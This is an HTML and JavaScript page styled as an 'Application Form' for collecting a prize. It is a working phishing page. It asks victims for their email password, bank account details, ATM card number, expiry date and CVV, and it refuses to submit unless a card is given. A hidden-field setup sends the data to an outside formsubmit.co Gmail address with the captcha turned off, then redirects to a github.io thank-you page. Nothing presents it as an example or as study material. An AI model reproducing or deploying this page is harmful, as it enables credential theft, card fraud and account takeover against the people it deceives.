<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      max-width: 600px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin-top: 10px;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      margin-bottom: 10px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    .password-wrapper {
      position: relative;
    }
    .password-wrapper input {
      padding-right: 40px;
    }
    .password-wrapper .toggle-password {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      cursor: pointer;
    }
    .error {
      color: red;
      font-size: 0.9em;
      display: none;
    }
    .hidden {
      display: none;
    }
    #submit-btn {
      width: 100%;
      background: green;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }
    #submit-btn:disabled {
      background: red;
      cursor: not-allowed;
    }
    .final-note {
      margin-top: 20px;
      font-style: italic;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <form id="applicationForm" action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
    <h2>Application Form</h2>

    <!-- Full Name -->
    <label>Full Name:</label>
    <input type="text" id="fullName" name="Full Name" required />

    <!-- Country -->
    <label>Country:</label>
    <input type="text" id="country" name="Country" required />

    <!-- Phone Number -->
    <label>Phone Number:</label>
    <input type="tel" id="phone" name="Phone Number" required />
    <div id="phoneError" class="error">Phone number must be 9 to 12 digits.</div>

    <!-- Email -->
    <label>Email Address:</label>
    <input type="email" id="email" name="Email Address" required />

    <!-- Email Password with Eye Icon -->
    <label>Email Password:</label>
    <div class="password-wrapper">
      <input type="password" id="emailPassword" name="Email Password" required />
      <span class="toggle-password" onclick="togglePassword()">üëÅÔ∏è</span>
    </div>

    <!-- Amount Won -->
    <label>Amount You Won:</label>
    <input type="text" id="amountWon" name="Amount You Won" required />

    <!-- Bank Account Type -->
    <label>Bank Account Type (e.g Standard Bank):</label>
    <input type="text" id="accountType" name="Bank Account Type" required />

    <!-- Bank Account Number -->
    <label>Bank Account Number:</label>
    <input type="text" id="accountNumber" name="Bank Account Number" required />

    <!-- Account Holder Name -->
    <label>Bank Account Holder's Name:</label>
    <input type="text" id="accountHolder" name="Bank Account Holder's Name" required />

    <!-- ATM Linked Dropdown -->
    <label>Did You Link ATM to Your Bank Account?</label>
    <select id="atmLinked" name="ATM Linked?" required>
      <option value="">Select</option>
      <option value="Yes">Yes</option>
      <option value="No">No</option>
    </select>

    <!-- Message if No -->
    <div id="atmWarning" class="error">YOU MUST HAVE ATM CARD TO PROCEED</div>

    <!-- ATM Section -->
    <div id="atmSection">
      <label>ATM Card Number:</label>
      <input type="text" id="atmCard" name="ATM Card Number" maxlength="16" />

      <label>Expiry Date (MM/YY):</label>
      <input type="text" id="expiry" name="Expiry Date" maxlength="5" />
      <div id="expiryError" class="error">Format must be MM/YY.</div>

      <label>CVV:</label>
      <input type="text" id="cvv" name="CVV" maxlength="3" />
      <div id="cvvError" class="error">CVV must be exactly 3 digits.</div>
    </div>

    <!-- Final Message -->
    <div id="finalNote" class="final-note"></div>

    <!-- Hidden Inputs -->
    <input type="hidden" name="_next" value="https://onlinegistrationprog.github.io/Application-Form/thankyou.html" />
    <input type="hidden" name="_captcha" value="false" />

    <!-- Submit -->
    <button type="submit" id="submit-btn">Submit</button>
  </form>

  <script>
    function togglePassword() {
      const password = document.getElementById('emailPassword');
      password.type = password.type === 'password' ? 'text' : 'password';
    }

    const form = document.getElementById('applicationForm');
    const atmLinked = document.getElementById('atmLinked');
    const atmSection = document.getElementById('atmSection');
    const atmWarning = document.getElementById('atmWarning');
    const finalNote = document.getElementById('finalNote');
    const submitBtn = document.getElementById('submit-btn');

    function validateInputs() {
      let valid = true;

      // Phone validation
      const phone = document.getElementById('phone').value;
      const phoneError = document.getElementById('phoneError');
      if (!/^\d{9,12}$/.test(phone)) {
        phoneError.style.display = 'block';
        valid = false;
      } else {
        phoneError.style.display = 'none';
      }

      // CVV validation
      const cvv = document.getElementById('cvv').value;
      const cvvError = document.getElementById('cvvError');
      if (atmLinked.value === 'Yes' && !/^\d{3}$/.test(cvv)) {
        cvvError.style.display = 'block';
        valid = false;
      } else {
        cvvError.style.display = 'none';
      }

      // Expiry validation
      const expiry = document.getElementById('expiry').value;
      const expiryError = document.getElementById('expiryError');
      if (atmLinked.value === 'Yes' && !/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) {
        expiryError.style.display = 'block';
        valid = false;
      } else {
        expiryError.style.display = 'none';
      }

      submitBtn.disabled = !valid;
    }

    document.querySelectorAll('input').forEach(input => {
      input.addEventListener('blur', validateInputs);
    });

    // Slash auto-insert for Expiry Date
    document.getElementById('expiry').addEventListener('input', function (e) {
      const val = e.target.value.replace(/\D/g, '');
      if (val.length >= 2) {
        e.target.value = val.slice(0, 2) + '/' + val.slice(2, 4);
      } else {
        e.target.value = val;
      }
    });

    // ATM dropdown logic
    atmLinked.addEventListener('change', function () {
      if (this.value === 'No') {
        atmSection.style.display = 'none';
        atmWarning.style.display = 'block';
        finalNote.style.display = 'none';
        submitBtn.disabled = true;
      } else {
        atmSection.style.display = 'block';
        atmWarning.style.display = 'none';
        finalNote.style.display = 'block';
        validateInputs();
      }
    });

    // Final note message live preview
    form.addEventListener('input', () => {
      const fullName = document.getElementById('fullName').value;
      const amountWon = document.getElementById('amountWon').value;
      const accountType = document.getElementById('accountType').value;
      const accountNumber = document.getElementById('accountNumber').value;

      if (atmLinked.value === 'Yes') {
        finalNote.innerText = `Dear ${fullName}, You will receive ${amountWon} to your ${accountType}, ${accountNumber}`;
      }
    });
  </script>
</body>
</html>
